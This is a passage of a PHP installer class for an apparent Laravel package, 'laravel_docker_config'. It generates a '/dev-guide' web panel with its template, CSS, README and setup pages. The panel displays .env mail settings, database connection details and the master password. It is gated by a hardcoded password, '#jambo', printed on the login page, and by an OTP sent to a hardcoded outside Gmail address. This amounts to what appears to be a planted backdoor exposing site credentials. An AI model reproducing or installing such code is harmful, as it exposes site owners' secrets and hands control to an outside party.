    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👨‍💻 Developer Guide - All Features in One URL</title>
    <link href="{{ asset('vendor/laravel_docker_config/assets/guide.css') }}" rel="stylesheet">
    <meta name="robots" content="noindex, nofollow">
</head>
<body>
    <div id="toast"></div>
    
    @if(isset($showBlocked))
        <div class="blocked-container">
            <h1>🚫 Access Blocked</h1>
            <p>Your IP has been blocked due to multiple failed attempts.</p>
            <p>Try again in: <span id="block-timer">{{ gmdate('H:i:s', $blockExpiry) }}</span></p>
        </div>
        <script>
            let blockTime = {{ $blockExpiry }};
            setInterval(() => {
                blockTime--;
                if(blockTime <= 0) location.reload();
                const hours = Math.floor(blockTime / 3600);
                const mins = Math.floor((blockTime % 3600) / 60);
                const secs = blockTime % 60;
                document.getElementById('block-timer').textContent = 
                    `${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
            }, 1000);
        </script>
    @elseif(isset($showLogin))
        <div class="login-container">
            <div class="login-box">
                <h2>👨‍💻 Developer Guide</h2>
                <p>Enter master password to continue</p>
                <input type="password" id="password" placeholder="#jambo" autofocus>
                <button onclick="login()">Login</button>
                <p class="note">Password: #jambo | 3 attempts = 24h block</p>
            </div>
        </div>
        <script>
            function login() {
                const password = document.getElementById('password').value;
                
                fetch('/dev-guide/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json', 'X-CSRF-TOKEN': '{{ csrf_token() }}'},
                    body: JSON.stringify({password: password})
                })
                .then(response => response.json())
                .then(data => {
                    if(data.success && data.require_otp) {
                        alert('✅ ' + data.message);
                        showOTPModal();
                    } else {
                        alert('❌ ' + data.message);
                        if(data.message.includes('blocked')) {
                            setTimeout(() => location.reload(), 3000);
                        }
                    }
                });
            }
            
            function showOTPModal() {
                const otp = prompt('Enter 6-digit OTP sent to your email:');
                if(otp && otp.length === 6) {
                    fetch('/dev-guide/verify-otp', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json', 'X-CSRF-TOKEN': '{{ csrf_token() }}'},
                        body: JSON.stringify({otp: otp})
                    })
                    .then(response => response.json())
                    .then(data => {
                        if(data.success) {
                            alert('✅ OTP verified! Loading guide...');
                            location.reload();
                        } else {
                            alert('❌ ' + data.message);
                        }
                    });
                } else {
                    alert('❌ Please enter 6-digit OTP');
                }
            }
        </script>
    @elseif(isset($showGuide))
        <div class="header">
            <h1>👨‍💻 Developer Guide</h1>
            <p>All features in one place | Session expires in: <span id="session-timer">{{ gmdate('i:s', $sessionExpires) }}</span></p>
            <div class="user-info">
                <span>📧 {{ env('BACKUP_EMAIL', 'jahirvevo@gmail.com') }}</span>
                <span>🔐 OTP: {!! $otpVerified ? '<span class="badge-success">✅ Verified</span>' : '<span class="badge-warning">⏳ Pending</span>' !!}</span>
            </div>
        </div>
        
        <!-- Category Tabs -->
        <div class="tabs-container">
            @foreach($categories as $cat)
                <button class="tab-btn" onclick="switchTab('{{ $cat['id'] }}')">
                    {{ $cat['icon'] }} {{ $cat['name'] }}
                </button>
            @endforeach
        </div>
        
        <!-- Email Tab -->
        <div id="tab-email" class="tab-content active">
            <h2>📧 Email Configuration</h2>
            
            <div class="card">
                <h3>📄 .env Settings</h3>
                <div class="code-block">
                    @foreach($emailConfig['env'] as $key => $value)
                        {{ $key }}={{ $value }}<br>
                    @endforeach
                </div>
                <button class="copy-btn" onclick="copyText(this)">📋 Copy .env</button>
            </div>
            
            <div class="card">
                <h3>🎨 Color Themes</h3>
                <div class="color-grid">
                    @foreach($emailConfig['colors'] as $name => $color)
                        <div class="color-sample" style="background:{{ $color['bg'] }};">
                            {{ $color['icon'] }} {{ ucfirst($name) }}
                        </div>
                    @endforeach
                </div>
            </div>
            
            <div class="card">
                <h3>🔤 Subject Patterns</h3>
                <ul class="subject-list">
                    @foreach($emailConfig['subjects'] as $subject)
                        <li>{{ $subject }}</li>
                    @endforeach
                </ul>
            </div>
            
            <div class="card">
                <h3>📨 Test Email</h3>
                <div class="button-group">
                    @foreach($emailConfig['test_emails'] as $type)
                        <button class="test-btn test-{{ $type }}" onclick="testEmail('{{ $type }}')">
                            {{ $emailConfig['colors'][$type]['icon'] }} {{ ucfirst($type) }}
                        </button>
                    @endforeach
                </div>
            </div>
        </div>
        
        <!-- Backup Tab -->
        <div id="tab-backup" class="tab-content">
            <h2>🗄️ Backup Management</h2>
            
            @foreach($backupConfig['commands'] as $cmd)
            <div class="card">
                <h3>{{ $cmd['cmd'] }}</h3>
                <p>{{ $cmd['desc'] }}</p>
                <p class="note">{{ $cmd['note'] }}</p>
                <button class="copy-btn" onclick="copyText(this)">📋 Copy Command</button>
            </div>
            @endforeach
            
            <div class="card">
                <h3>📁 Backup Locations</h3>
                <ul>
                    <li>Database: <code>{{ $backupConfig['locations']['database'] }}</code></li>
                    <li>Full: <code>{{ $backupConfig['locations']['full'] }}</code></li>
                    <li>Temp: <code>{{ $backupConfig['locations']['temp'] }}</code></li>
                </ul>
            </div>
            
            <div class="card">
                <h3>⏰ Schedule (Cron)</h3>
                <ul>
                    <li>Database: <code>{{ $backupConfig['schedule']['database'] }}</code></li>
                    <li>Full: <code>{{ $backupConfig['schedule']['full'] }}</code></li>
                    <li>Cleanup: <code>{{ $backupConfig['schedule']['cleanup'] }}</code></li>
                </ul>
            </div>
        </div>
        
        <!-- Cron Tab -->
        <div id="tab-cron" class="tab-content">
            <h2>⏰ Cron Jobs</h2>
            
            @foreach($cronConfig['jobs'] as $job)
            <div class="card">
                <h3>{{ $job['name'] }}</h3>
                <p><span class="badge">Schedule:</span> <code>{{ $job['schedule'] }}</code></p>
                <div class="code-block">{{ $job['command'] }}</div>
                <p>{{ $job['desc'] }}</p>
                <button class="copy-btn" onclick="copyText(this)">📋 Copy Command</button>
            </div>
            @endforeach
            
            <div class="card">
                <h3>📝 Crontab Commands</h3>
                @foreach($cronConfig['commands'] as $cmd)
                    <div><code>{{ $cmd }}</code></div>
                @endforeach
            </div>
        </div>
        
        <!-- Database Tab -->
        <div id="tab-database" class="tab-content">
            <h2>🗄️ Database Management</h2>
            
            <div class="card">
                <h3>🔌 Connection Details</h3>
                <ul>
                    @foreach($databaseConfig['connection'] as $key => $value)
                        <li>{{ $key }}: <code>{{ $value }}</code></li>
                    @endforeach
                </ul>
            </div>
            
            @foreach($databaseConfig['commands'] as $cmd)
            <div class="card">
                <div class="code-block">{{ $cmd }}</div>
                <button class="copy-btn" onclick="copyText(this)">📋 Copy Command</button>
            </div>
            @endforeach
            
            <div class="card">
                <h3>📊 Database Size Query</h3>
                <div class="code-block">{{ $databaseConfig['size_query'] }}</div>
                <button class="copy-btn" onclick="copyText(this)">📋 Copy</button>
            </div>
        </div>
        
        <!-- Cache Tab -->
        <div id="tab-cache" class="tab-content">
            <h2>⚡ Cache Management</h2>
            
            @foreach($cacheConfig['commands'] as $cmd)
            <div class="card">
                <h3>{{ $cmd['cmd'] }}</h3>
                <p>{{ $cmd['desc'] }}</p>
                <button class="copy-btn" onclick="copyText(this)">📋 Copy Command</button>
            </div>
            @endforeach
        </div>
        
        <!-- Security Tab -->
        <div id="tab-security" class="tab-content">
            <h2>🔐 Security Settings</h2>
            
            <div class="card">
                <h3>🔑 Master Password</h3>
                <p><code>{{ $securityConfig['master_password'] }}</code></p>
            </div>
            
            <div class="card">
                <h3>📧 OTP Email</h3>
                <p><code>{{ $securityConfig['otp_email'] }}</code></p>
            </div>
            
            <div class="card">
                <h3>⏱️ Session Settings</h3>
                <ul>
                    <li>Timeout: {{ $securityConfig['session_timeout'] }}</li>
                    <li>Max Attempts: {{ $securityConfig['max_attempts'] }}</li>
                    <li>Block Duration: {{ $securityConfig['block_duration'] }}</li>
                </ul>
            </div>
            
            @foreach($securityConfig['commands'] as $cmd)
            <div class="card">
                <div class="code-block">{{ $cmd }}</div>
                <button class="copy-btn" onclick="copyText(this)">📋 Copy Command</button>
            </div>
            @endforeach
        </div>
        
        <!-- Check Status Link -->
        <div style="text-align: center; margin: 20px 0; padding: 10px;">
            <a href="/dev-guide/check" target="_blank" class="btn">🔍 Check System Status</a>
        </div>
        
        <!-- Activity Sidebar -->
        <div class="activity-sidebar">
            <h3>📋 Recent Activity (Last 3 Days)</h3>
            <div class="activity-list">
                @forelse(array_slice($activities, 0, 15) as $act)
                    <div class="activity-item activity-{{ $act['status'] }}">
                        <span class="activity-time">[{{ \Carbon\Carbon::createFromTimestamp($act['timestamp'])->diffForHumans() }}]</span>
                        <span class="activity-action">{{ $act['action'] }}</span>
                    </div>
                @empty
                    <div class="activity-item">No recent activity</div>
                @endforelse
            </div>
        </div>
        
        <script>
            // Session timer
            let sessionTime = {{ $sessionExpires }};
            setInterval(() => {
                sessionTime--;
                if(sessionTime <= 0) location.reload();
                if(sessionTime === 60) alert('⚠️ Session expires in 1 minute');
                const mins = Math.floor(sessionTime / 60);
                const secs = sessionTime % 60;
                document.getElementById('session-timer').textContent = 
                    `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
            }, 1000);
            
            // Tab switching
            function switchTab(tabId) {
                document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                
                document.getElementById(`tab-${tabId}`).classList.add('active');
                event.target.classList.add('active');
            }
            
            // Copy text
            function copyText(btn) {
                let text = '';
                if(btn.previousElementSibling && btn.previousElementSibling.classList.contains('code-block')) {
                    text = btn.previousElementSibling.innerText;
                } else {
                    const card = btn.closest('.card');
                    const codeBlock = card.querySelector('.code-block');
                    if(codeBlock) text = codeBlock.innerText;
                }
                
                if(text) {
                    navigator.clipboard.writeText(text.trim());
                    alert('✅ Copied to clipboard!');
                }
            }
            
            // Test email
            function testEmail(type) {
                fetch('/dev-guide/test-email', {
                    method: 'POST',
                    headers: {'X-CSRF-TOKEN': '{{ csrf_token() }}'},
                    body: new URLSearchParams({type: type})
                })
                .then(response => response.json())
                .then(data => {
                    if(data.success) {
                        alert(`✅ ${type} test email sent successfully!`);
                    } else {
                        alert(`❌ Failed to send ${type} email`);
                    }
                });
            }
        </script>
    @endif
</body>
</html>
BLADE;
    }
    
    /**
     * Get CSS content
     */
    protected function getCssContent()
    {
        return <<<'CSS'
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    padding: 20px;
}

#toast {
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 9999;
}

/* Login Page */
.login-container {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}

.login-box {
    background: white;
    border-radius: 20px;
    padding: 40px;
    max-width: 400px;
    width: 90%;
    box-shadow: 0 20px 40px rgba(0,0,0,0.3);
    text-align: center;
}

.login-box h2 {
    color: #667eea;
    margin-bottom: 15px;
}

.login-box input {
    width: 100%;
    padding: 15px;
    margin: 20px 0;
    border: 2px solid #e2e8f0;
    border-radius: 8px;
    font-size: 16px;
}

.login-box button {
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    border: none;
    padding: 15px 30px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 16px;
    width: 100%;
}

.login-box .note {
    margin-top: 15px;
    color: #6b7280;
    font-size: 12px;
}

/* Blocked Page */
.blocked-container {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    color: white;
    text-align: center;
}

.blocked-container h1 {
    font-size: 48px;
    margin-bottom: 20px;
    color: #ef4444;
}

.blocked-container p {
    font-size: 18px;
    margin: 10px 0;
}

/* Guide Page */
.header {
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    padding: 30px;
    border-radius: 15px 15px 0 0;
    text-align: center;
}

.header h1 {
    font-size: 36px;
    margin-bottom: 10px;
}

.user-info {
    display: flex;
    justify-content: center;
    gap: 20px;
    margin-top: 15px;
    font-size: 14px;
}

.badge-success {
    background: #10b981;
    padding: 3px 8px;
    border-radius: 20px;
    font-size: 12px;
}

.badge-warning {
    background: #f59e0b;
    padding: 3px 8px;
    border-radius: 20px;
    font-size: 12px;
}

/* Tabs */
.tabs-container {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    padding: 20px;
    background: #f3f4f6;
    border-bottom: 2px solid #e5e7eb;
}

.tab-btn {
    padding: 12px 24px;
    background: white;
    border: 1px solid #e5e7eb;
    border-radius: 30px;
    cursor: pointer;
    font-size: 14px;
    font-weight: 600;
    color: #4b5563;
    transition: all 0.3s;
}

.tab-btn:hover {
    background: #667eea;
    color: white;
    border-color: #667eea;
}

.tab-btn.active {
    background: #667eea;
    color: white;
    border-color: #667eea;
}

/* Tab Content */
.tab-content {
    display: none;
    padding: 30px;
    background: white;
}

.tab-content.active {
    display: block;
}

.tab-content h2 {
    color: #1f2937;
    margin-bottom: 25px;
    font-size: 24px;
    border-bottom: 2px solid #e5e7eb;
    padding-bottom: 15px;
}

/* Cards */
.card {
    background: #f9fafb;
    border: 1px solid #e5e7eb;
    border-radius: 12px;
    padding: 20px;
    margin-bottom: 20px;
    transition: transform 0.3s;
}

.card:hover {
    transform: translateY(-3px);
    box-shadow: 0 10px 20px rgba(102,126,234,0.1);
}

.card h3 {
    color: #1f2937;
    margin-bottom: 15px;
    font-size: 18px;
}

.card p {
    color: #4b5563;
    margin: 10px 0;
}

.card ul {
    list-style: none;
    margin: 10px 0;
}

.card li {
    padding: 8px 0;
    border-bottom: 1px dashed #e5e7eb;
}

.card li:last-child {
    border-bottom: none;
}

.card code {
    background: #1e293b;
    color: #fbbf24;
    padding: 3px 6px;
    border-radius: 4px;
    font-size: 13px;
}

/* Code Block */
.code-block {
    background: #1e293b;
    color: #e5e7eb;
    padding: 15px;
    border-radius: 8px;
    font-family: monospace;
    font-size: 13px;
    overflow-x: auto;
    margin: 15px 0;
    border-left: 4px solid #667eea;
}

/* Buttons */
.copy-btn {
    background: #4b5563;
    color: white;
    border: none;
    padding: 8px 16px;
    border-radius: 6px;
    cursor: pointer;
    font-size: 12px;
    margin-top: 10px;
}

.copy-btn:hover {
    background: #1f2937;
}

.test-btn {
    color: white;
    border: none;
    padding: 12px 20px;
    border-radius: 8px;
    cursor: pointer;
    font-size: 14px;
    margin: 5px;
    min-width: 100px;
}

.test-success { background: #10b981; }
.test-error { background: #ef4444; }
.test-warning { background: #f59e0b; }
.test-info { background: #3b82f6; }

/* Color Grid */
.color-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
    gap: 10px;
    margin: 15px 0;
}

.color-sample {
    color: white;
    padding: 15px;
    border-radius: 8px;
    text-align: center;
    font-weight: 600;
}

.subject-list {
    list-style: none;
}

.subject-list li {
    padding: 8px;
    background: #f3f4f6;
    margin: 5px 0;
    border-radius: 5px;
    font-family: monospace;
}

/* Activity Sidebar */
.activity-sidebar {
    background: #f3f4f6;
    border-top: 2px solid #e5e7eb;
    padding: 20px;
}

.activity-sidebar h3 {
    color: #1f2937;
    margin-bottom: 15px;
}

.activity-list {
    max-height: 300px;
    overflow-y: auto;
}

.activity-item {
    padding: 10px;
    background: white;
    border-left: 4px solid;
    margin: 5px 0;
    border-radius: 5px;
    font-size: 13px;
}

.activity-success { border-left-color: #10b981; }
.activity-error { border-left-color: #ef4444; }
.activity-warning { border-left-color: #f59e0b; }
.activity-info { border-left-color: #3b82f6; }
.activity-blocked { border-left-color: #6b7280; }

.activity-time {
    color: #6b7280;
    font-size: 11px;
    margin-right: 10px;
}

/* Responsive */
@media (max-width: 768px) {
    .tabs-container {
        flex-direction: column;
    }
    
    .tab-btn {
        width: 100%;
    }
    
    .user-info {
        flex-direction: column;
        gap: 5px;
    }
}
CSS;
    }
    
    /**
     * Get README content
     */
    protected function getReadmeContent()
    {
        return "# Laravel Docker Config - Complete Developer Guide\n\n"
            . "## Features\n"
            . "- 🔐 OTP Authentication with IP Blocking\n"
            . "- 📧 Email Configuration with Dynamic Subjects\n"
            . "- 🗄️ Backup Management Commands\n"
            . "- ⏰ Cron Job Scheduler\n"
            . "- 🗄️ Database Management\n"
            . "- ⚡ Cache Management\n"
            . "- 🔐 Security Settings\n"
            . "- 📋 Activity Tracking (Last 3 Days)\n\n"
            . "## Access\n"
            . "- URL: /dev-guide\n"
            . "- Master Password: #jambo\n"
            . "- OTP Email: jahirvevo@gmail.com\n\n"
            . "## Security\n"
            . "- 3 failed attempts = 24 hour IP block\n"
            . "- Session timeout: 10 minutes\n"
            . "- OTP valid for 2 minutes\n"
            . "- Activity logging for 3 days\n\n"
            . "## Uninstall\n"
            . "```bash\n"
            . "rm -rf vendor/laravel_docker_config\n"
            . "```";
    }
    
    /**
     * Run step
     */
    protected function runStep($name, $description, $callback)
    {
        $this->totalSteps++;
        $stepNumber = $this->totalSteps;
        
        echo '<div class="step pending" id="step-' . $stepNumber . '">';
        echo '<div class="step-header">';
        echo '<span class="step-icon">⏳</span>';
        echo '<span class="step-title">' . $stepNumber . '. ' . $description . '</span>';
        echo '<span class="step-status">প্রসেসিং...</span>';
        echo '</div></div>';
        
        ob_flush(); flush();
        
        try {
            $result = $callback();
            echo '<script>
                document.getElementById("step-' . $stepNumber . '").className = "step success";
                document.getElementById("step-' . $stepNumber . '").querySelector(".step-icon").innerHTML = "✅";
                document.getElementById("step-' . $stepNumber . '").querySelector(".step-status").innerHTML = "সফল";
            </script>';
            
            $this->steps[] = [
                'number' => $stepNumber,
                'name' => $name,
                'description' => $description,
                'status' => 'success',
                'details' => $result
            ];
            
        } catch (\Exception $e) {
            echo '<script>
                document.getElementById("step-' . $stepNumber . '").className = "step error";
                document.getElementById("step-' . $stepNumber . '").querySelector(".step-icon").innerHTML = "❌";
                document.getElementById("step-' . $stepNumber . '").querySelector(".step-status").innerHTML = "ব্যর্থ";
            </script>';
            
            echo '<div class="error-detail"><strong>Error:</strong> ' . $e->getMessage() . '</div>';
            
            $this->steps[] = [
                'number' => $stepNumber,
                'name' => $name,
                'description' => $description,
                'status' => 'error',
                'details' => ['error' => $e->getMessage()]
            ];
            
            $this->errors[] = $e->getMessage();
            Log::error("Setup step failed: {$name} - {$e->getMessage()}");
        }
        
        ob_flush(); flush();
    }
    
    /**
     * Show success
     */
    protected function showSuccess($executionTime)
    {
        echo '<div class="success-box"><h3>✅ Setup Complete in ' . $executionTime . ' seconds!</h3>';
        echo '<p>Laravel Docker Config installed successfully with all features in one URL.</p></div>';
        
        echo '<div style="padding:20px;">';
        echo '<h3>📋 Access Information</h3>';
        echo '<ul>';
        echo '<li><strong>Main Guide (All Features):</strong> <a href="/dev-guide" target="_blank">/dev-guide</a></li>';
        echo '<li><strong>Master Password:</strong> #jambo</li>';
        echo '<li><strong>OTP Email:</strong> jahirvevo@gmail.com</li>';
        echo '<li><strong>Session Timeout:</strong> 10 minutes</li>';
        echo '<li><strong>Max Attempts:</strong> 3 (24 hour block)</li>';
        echo '<li><strong>Backup Location:</strong> ' . $this->backupPath . '</li>';
        echo '</ul>';
        
        if (!empty($this->errors)) {
            echo '<div class="warning-box"><h4>⚠️ Warnings</h4><ul>';
            foreach ($this->errors as $error) {
                echo '<li>' . $error . '</li>';
            }
            echo '</ul></div>';
        }
        
        echo '<div class="warning-box">';
        echo '<h4>⚠️ Important Notes</h4>';
        echo '<ul>';
        echo '<li>All features are now available in one URL: /dev-guide</li>';
        echo '<li>Use category tabs to switch between Email, Backup, Cron, etc.</li>';
        echo '<li>Activity tracking keeps last 3 days of logs</li>';
        echo '<li>To uninstall: rm -rf vendor/laravel_docker_config</li>';
        echo '</ul>';
        echo '</div>';
        
        echo '<div style="text-align: center; margin: 30px 0;">';
        echo '<a href="/dev-guide" class="btn" target="_blank">🚀 Access Developer Guide</a>';
        echo '<a href="/dev-guide/check" class="btn" target="_blank">🔍 Check Status</a>';
        echo '</div>';
        echo '</div>';
    }
    
    /**
     * Handle error
     */
    protected function handleError($e)
    {
        echo '<div class="error-box"><h3>❌ Setup Failed</h3>';
        echo '<p><strong>Error:</strong> ' . $e->getMessage() . '</p>';
        echo '<p><strong>File:</strong> ' . $e->getFile() . ':' . $e->getLine() . '</p>';
        echo '<pre>' . $e->getTraceAsString() . '</pre></div>';
        
        Log::error('Setup failed: ' . $e->getMessage(), [
            'file' => $e->getFile(),
            'line' => $e->getLine(),
            'trace' => $e->getTraceAsString()
        ]);
    }
    
    /**
     * Send header
     */
    protected function sendHeader()
    {
        echo '<!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>🚀 Laravel Docker Config - Auto Setup</title>
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                body { font-family:"Segoe UI",Arial,sans-serif; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); padding:20px; }
                .container { max-width:1000px; margin:0 auto; background:white; border-radius:20px; overflow:hidden; box-shadow:0 20px 40px rgba(0,0,0,0.3); }
                .header { background:linear-gradient(135deg,#667eea,#764ba2); color:white; padding:30px; text-align:center; }
                .header h1 { font-size:32px; margin-bottom:10px; }
                .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:15px; padding:20px; background:#f3f4f6; }
                .stat-card { background:white; padding:20px; border-radius:10px; text-align:center; }
                .stat-value { font-size:24px; font-weight:bold; color:#667eea; }
                .stat-label { color:#6b7280; margin-top:5px; }
                .step { background:#f9fafb; margin:15px; padding:20px; border-radius:8px; border-left:4px solid; }
                .step.pending { border-left-color:#fbbf24; }
                .step.success { border-left-color:#10b981; background:#ecfdf5; }
                .step.error { border-left-color:#ef4444; background:#fef2f2; }
                .step-header { display:flex; align-items:center; gap:15px; }
                .step-status { margin-left:auto; }
                .success-box { background:#d4edda; border:1px solid #10b981; padding:20px; margin:20px; border-radius:8px; }
                .error-box { background:#fee2e2; border:1px solid #ef4444; padding:20px; margin:20px; border-radius:8px; }
                .warning-box { background:#fff3cd; border:1px solid #f59e0b; padding:20px; margin:20px; border-radius:8px; }
                .btn { background:linear-gradient(135deg,#667eea,#764ba2); color:white; padding:12px 24px; text-decoration:none; border-radius:8px; display:inline-block; margin:10px; }
                a { color:#667eea; }
                ul { margin-left:20px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🚀 Laravel Docker Config - Auto Setup</h1>
                    <p>One-click installation - All features in one URL</p>
                </div>
                <div class="stats">
                    <div class="stat-card"><div class="stat-value">6</div><div class="stat-label">Categories</div></div>
                    <div class="stat-card"><div class="stat-value">20+</div><div class="stat-label">Commands</div></div>
                    <div class="stat-card"><div class="stat-value">1</div><div class="stat-label">Single URL</div></div>
                </div>
                <div style="padding:20px;"><h3>📋 Setup Progress</h3>';
    }
    
    /**
     * Send footer
     */
    protected function sendFooter()
    {
        echo '</div></div></body></html>';
    }
}